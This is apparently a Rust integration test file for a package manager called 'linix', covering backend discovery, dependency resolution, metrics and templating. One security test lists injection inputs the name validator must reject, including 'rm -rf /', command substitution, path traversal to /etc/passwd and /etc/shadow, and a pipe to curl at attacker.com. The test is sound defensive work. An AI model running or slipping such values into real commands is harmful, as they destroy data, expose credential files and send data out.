use linix::app::App;
use linix::config::Config;
use linix::core::{Package, PackageSpec, Validator, Backend, GraphAction, StateRegistry};
use linix::backends::github::GithubManager;
use std::collections::HashMap;

/// Integration test for the high-performance application kernel.
/// Verifies that the App can initialize, discover backends, and handle 
/// recursive dependency resolution for the DAG.
#[tokio::test]
async fn test_app_initialization_v3() {
    let config = Config::default();
    let app = App::new(config).await;
    
    assert!(app.is_ok(), "App failed to initialize: {:?}", app.err());
    
    let app = app.unwrap();
    let backends = app.available_backends();
    assert!(!backends.is_empty(), "No backends discovered.");
}

/// Verifies that the Interface Query pattern works for capability discovery.
#[tokio::test]
async fn test_backend_capability_discovery_solid() {
    let config = Config::default();
    let app = App::new(config).await.unwrap();
    
    let github = app.registry.get("github").expect("GitHub backend missing from registry");
    
    assert!(github.is_installable(), "GitHub must implement Installable");
    assert!(github.is_queryable(), "GitHub must implement Queryable");
}

/// Tests the recursive resolution engine which builds the inputs for the DAG.
#[tokio::test]
async fn test_dag_dependency_resolution() {
    let mut config = Config::default();
    config.aliases.insert("sys".into(), "apt".into());
    
    let app = App::new(config).await.unwrap();
    
    let spec_str = "sys:neovim@requires=apt:gcc;brew:ripgrep";
    
    let resolved = app.resolve_spec(spec_str).await.expect("Resolution failed");
    
    assert!(resolved.len() >= 1, "Resolver failed to expand dependencies correctly.");
}

/// Tests the Mission-Critical Security Validator.
#[tokio::test]
async fn test_security_validator_hardened() {
    assert!(Validator::validate_package_name("valid-pkg-123.stable").is_ok());
    
    let dangerous_inputs = vec![
        "pkg; rm -rf /",
        "pkgname$(whoami)",
        "pkgname > /etc/shadow",
        "../../etc/passwd",
        "pkgname | curl http://attacker.com",
    ];
    
    for input in dangerous_inputs {
        assert!(
            Validator::validate_package_name(input).is_err(), 
            "Security vulnerability: Validator failed to block: {}", input
        );
    }
}

/// Verifies that the Parallel Metrics Collector is thread-safe.
#[tokio::test]
async fn test_parallel_telemetry() {
    let metrics = linix::app::MetricsCollector::new();
    let start = chrono::Utc::now();

    let m1 = metrics.clone();
    let t1 = tokio::spawn(async move {
        m1.record_operation("task1", "apt", start, true, None);
    });

    let m2 = metrics.clone();
    let t2 = tokio::spawn(async move {
        m2.record_operation("task2", "cargo", start, false, Some("Network error".into()));
    });

    let _ = tokio::join!(t1, t2);
    
    metrics.print_summary();
}

/// Tests the ETag/Fingerprint logic for the Web Backend.
#[tokio::test]
async fn test_web_fingerprint_logic() {
    let executor = linix::core::CommandExecutor::new(true, false);
    let manager = linix::backends::web::WebManager::new(executor);
    
    assert_eq!(manager.name(), "web");
}

/// Tests the template_needs_update functionality.
#[tokio::test]
async fn test_template_needs_update() {
    use linix::app::sync::planner::ChangePlanner;
    use linix::backends::BackendRegistry;
    use linix::core::CommandExecutor;
    use tempfile::tempdir;
    use std::fs;
    
    let config = Config::default();
    let executor = CommandExecutor::new(true, false);
    let registry = Arc::new(BackendRegistry::new());
    let state = StateRegistry::default();
    let planner = ChangePlanner::new(registry, &state, &config);
    
    let dir = tempdir().unwrap();
    let source_path = dir.path().join("source.tpl");
    let target_path = dir.path().join("target.txt");
    
    fs::write(&source_path, "hello world").unwrap();
    
    let mut options = HashMap::new();
    options.insert("target".to_string(), target_path.to_string_lossy().to_string());
    options.insert("template".to_string(), "true".to_string());
    
    let spec = PackageSpec {
        name: source_path.to_string_lossy().to_string(),
        backend: "link".to_string(),
        options,
        requires: vec![],
    };
    
    // Target doesn't exist - needs update
    assert!(planner.template_needs_update(&spec).await);
    
    // Create target with matching content
    fs::write(&target_path, "hello world").unwrap();
    assert!(!planner.template_needs_update(&spec).await);
}

/// Tests cross-backend teleport functionality.
#[tokio::test]
async fn test_teleport_functionality() {
    let config = Config::default();
    let app = App::new(config).await.unwrap();
    let teleporter = app.teleporter();
    
    // Teleport should fail gracefully for non-existent packages
    let result = teleporter.teleport("nonexistent-package-xyz", "cargo").await;
    // In dry-run or with missing package, should return error
    let _ = result;
}